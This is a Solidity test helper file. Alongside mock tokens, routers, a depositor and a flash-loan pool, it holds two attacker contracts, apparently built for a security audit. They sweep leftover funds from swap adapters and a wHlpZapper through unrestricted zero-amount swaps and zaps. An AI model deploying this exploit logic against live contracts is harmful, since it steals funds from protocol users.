// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {ILiquidSwap} from "../contracts/interfaces/ILiquidSwap.sol";
import {HypertradeAdapter} from "../contracts/periphery/HypertradeAdapter.sol";
import {GluexAdapter} from "../contracts/periphery/GluexAdapter.sol";
import {LiquidSwapAdapter} from "../contracts/periphery/LiquidSwapAdapter.sol";
import {wHlpZapper} from "../contracts/periphery/wHlpZapper.sol";
import {Looping} from "../contracts/Looping.sol";
import {IWrappedHype} from "../contracts/interfaces/IWrappedHype.sol";

/// @dev Minimal ERC20 with real balance/allowance accounting. Zero-value pulls
/// are valid, matching OpenZeppelin ERC20 behavior when no tokens move.
contract MockERC20 is IERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
        emit Transfer(address(0), to, amount);
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        if (amount != 0) {
            uint256 allowed = allowance[from][msg.sender];
            require(allowed >= amount, "allowance");
            if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        }
        _move(from, to, amount);
        return true;
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function burn(uint256 amount) external {
        require(balanceOf[msg.sender] >= amount, "burn balance");
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        emit Transfer(msg.sender, address(0), amount);
    }

    function burnFrom(address from, uint256 amount) external {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "burn allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        require(balanceOf[from] >= amount, "burn balance");
        balanceOf[from] -= amount;
        totalSupply -= amount;
        emit Transfer(from, address(0), amount);
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
    }
}

/// @dev A router whose arbitrary-calldata fallback succeeds and produces no output.
contract MockNoOpRouter {
    fallback() external payable {}
    receive() external payable {}
}

/// @dev WHYPE model used to test native router refunds becoming adapter residuals.
contract MockWHYPE is MockERC20, IWrappedHype {
    constructor() MockERC20("wrapped HYPE", "WHYPE", 18) {}

    function deposit() external payable override {
        totalSupply += msg.value;
        balanceOf[msg.sender] += msg.value;
        emit Transfer(address(0), msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external override {
        require(balanceOf[msg.sender] >= wad, "WHYPE balance");
        balanceOf[msg.sender] -= wad;
        totalSupply -= wad;
        emit Transfer(msg.sender, address(0), wad);
        (bool ok,) = msg.sender.call{value: wad}("");
        require(ok, "native transfer");
    }

    receive() external payable {}
}

/// @dev calldata 0x01 models a router returning native dust to the adapter;
/// any other nonempty calldata is a successful no-op.
contract MockRefundRouter {
    fallback() external payable {
        if (msg.data.length == 1 && msg.data[0] == 0x01 && address(this).balance > 0) {
            (bool ok,) = payable(msg.sender).call{value: 1 ether}("");
            require(ok, "refund");
        }
    }

    receive() external payable {}
}

/// @dev LiquidSwap-compatible no-op router: the call succeeds and produces no output.
contract MockLiquidRouter {
    function executeSwaps(
        address[] calldata,
        uint256,
        uint256,
        uint256,
        ILiquidSwap.Swap[][] calldata,
        uint256,
        address
    ) external returns (uint256) {
        return 0;
    }

    fallback() external payable {}
    receive() external payable {}
}

/// @dev One-share-per-USDT0 model depositor. It makes P&L measurable in USDT0
/// units by allowing immediate redemption; it is not a mainnet wHLP price model.
contract MockDepositor {
    MockERC20 public immutable shareToken;

    constructor() {
        shareToken = new MockERC20("model wHLP", "mwHLP", 18);
    }

    function deposit(
        address depositAsset,
        uint256 depositAmount,
        uint256 minimumMint,
        address to,
        bytes calldata
    ) external {
        require(IERC20(depositAsset).transferFrom(msg.sender, address(this), depositAmount), "deposit pull");
        shareToken.mint(to, depositAmount);
        require(depositAmount >= minimumMint, "minimumMint");
    }

    function redeem(address depositAsset, uint256 shares) external {
        shareToken.burnFrom(msg.sender, shares);
        require(IERC20(depositAsset).transfer(msg.sender, shares), "redeem transfer");
    }
}

/// @dev Captures the user encoded by Looping and can directly exercise the
/// callback as a whitelisted pool without modelling lending economics.
contract MockPool {
    address public lastUser;

    function flashLoanSimple(
        address,
        address,
        uint256,
        bytes calldata params,
        uint16
    ) external {
        (,,,,,, address user,,) = abi.decode(
            params,
            (uint8, address, address, address[], uint256, uint256, address, uint256, uint256)
        );
        lastUser = user;
    }

    function callExecuteOperation(
        Looping looping,
        address debtAsset,
        uint256 amount,
        uint256 premium,
        address initiator,
        bytes calldata params
    ) external returns (bool) {
        return looping.executeOperation(debtAsset, amount, premium, initiator, params);
    }
}

/// @dev Both route setting and swap happen inside one EVM transaction, as
/// required by transient storage. The sweep itself has no owner restriction.
contract AdapterAttacker {
    function hypertradeWithData(
        HypertradeAdapter adapter,
        address tokenIn,
        address tokenOut,
        bytes calldata data,
        address recipient
    ) external {
        adapter.setSwapPath(tokenIn, tokenOut, data);
        address[] memory path = _path(tokenIn, tokenOut);
        adapter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0, 0, path, recipient, address(0), block.timestamp + 1
        );
    }

    function sweepHypertrade(
        HypertradeAdapter adapter,
        address tokenIn,
        address tokenOut,
        address recipient
    ) external {
        adapter.setSwapPath(tokenIn, tokenOut, hex"00");
        address[] memory path = _path(tokenIn, tokenOut);
        adapter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0, 0, path, recipient, address(0), block.timestamp + 1
        );
    }

    function sweepGluex(
        GluexAdapter adapter,
        address tokenIn,
        address tokenOut,
        address recipient
    ) external {
        adapter.setSwapPath(tokenIn, tokenOut, hex"00");
        address[] memory path = _path(tokenIn, tokenOut);
        adapter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0, 0, path, recipient, address(0), block.timestamp + 1
        );
    }

    function sweepLiquid(
        LiquidSwapAdapter adapter,
        address tokenIn,
        address tokenOut,
        address recipient
    ) external {
        address[] memory tokens = _path(tokenIn, tokenOut);
        ILiquidSwap.Swap[][] memory hops = new ILiquidSwap.Swap[][](0);
        adapter.setSwapPath(tokens, tokenIn, tokenOut, hops);
        adapter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            0, 0, tokens, recipient, address(0), block.timestamp + 1
        );
    }

    function _path(address tokenIn, address tokenOut) internal pure returns (address[] memory path) {
        path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
    }
}

/// @dev Calls the vulnerable zap and immediately redeems model shares so the
/// attacker's profit is asserted in the same USDT0 units as the zapper's loss.
contract ZapperAttacker {
    function sweepLiquid(
        wHlpZapper zapper,
        MockDepositor depositor,
        address usdt0,
        address tokenIn,
        address recipient
    ) external {
        address[] memory tokens = new address[](2);
        tokens[0] = tokenIn;
        tokens[1] = usdt0;
        ILiquidSwap.Swap[][] memory hops = new ILiquidSwap.Swap[][](0);

        zapper.zapIn(tokenIn, 0, 0, 0, block.timestamp + 1, tokens, hops, 0, 0);

        MockERC20 shares = depositor.shareToken();
        uint256 minted = shares.balanceOf(address(this));
        shares.approve(address(depositor), minted);
        depositor.redeem(usdt0, minted);
        require(IERC20(usdt0).transfer(recipient, minted), "profit transfer");
    }
}
